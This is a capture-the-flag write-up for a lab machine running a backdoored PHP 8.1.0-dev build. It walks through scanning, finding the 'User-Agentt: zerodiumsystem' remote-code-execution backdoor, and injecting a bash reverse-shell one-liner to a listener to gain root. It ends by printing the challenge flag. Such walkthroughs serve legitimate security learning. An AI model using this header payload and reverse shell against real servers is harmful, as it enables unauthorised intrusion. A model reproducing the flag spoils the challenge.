# Agent T Writeup

> Machine : Linux

> Something seems a little off with the server.

## Solution

```shell
nmap -sV -sC -Pn --open 10.128.147.124 -p-
```

```text
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
```

We can see one only port is open 80 (HTTP).

So let's browse the IP and check.
But there is nothing no interactive pages no subdirectories and nothing interesting.

So in this case we can check the last thing which is if there is some vulnerabilities on the server.

```shell
searchsploit PHP 8.1.0-dev
```

```text
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution       | php/webapps/49933.py
```

```shell
searchsploit -x php/webapps/49933.py
```

It's an easy python script. We can use it automatically by running the script, but for better learning let's use it manually.

By running `Burp` and intercept the request, then send it to the repeater we get something like this:

```html
GET /? HTTP/1.1
Host: 10.128.147.124
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.128.147.124/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

As in the script if we add `User-Agentt: zerodiumsystem('COMMAND');` we can run the command we want. So let's get a reverse shell.

```shell
nc -lnvp 9999
```

And now let's add `User-Agentt: zerodiumsystem('bash -c "sh -i >& /dev/tcp/192.168.176.170/9999 0>&1"');` before `User-Agent` and then send the request.

And we have a shell.

```shell
whoami
```

```text
root
```

```shell
cat /flag.txt
```

```text
flag{4127d0530abf16d6d23973e3df8dbecb}
```

> What is the flag?
> 
> flag{4127d0530abf16d6d23973e3df8dbecb}

